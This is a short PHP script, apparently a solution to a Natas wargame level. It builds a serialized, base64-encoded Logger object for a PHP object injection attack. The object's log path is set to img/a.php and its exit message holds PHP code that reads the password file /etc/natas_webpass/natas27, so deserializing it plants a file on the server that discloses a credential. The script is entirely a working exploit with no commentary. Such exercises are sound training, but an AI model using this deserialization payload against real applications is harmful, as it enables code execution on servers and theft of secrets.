<?php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        $this->initMsg="hello\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
        $this->logFile = "img/a.php";
    }
}

$logger = new Logger();

print base64_encode(serialize($logger));
?>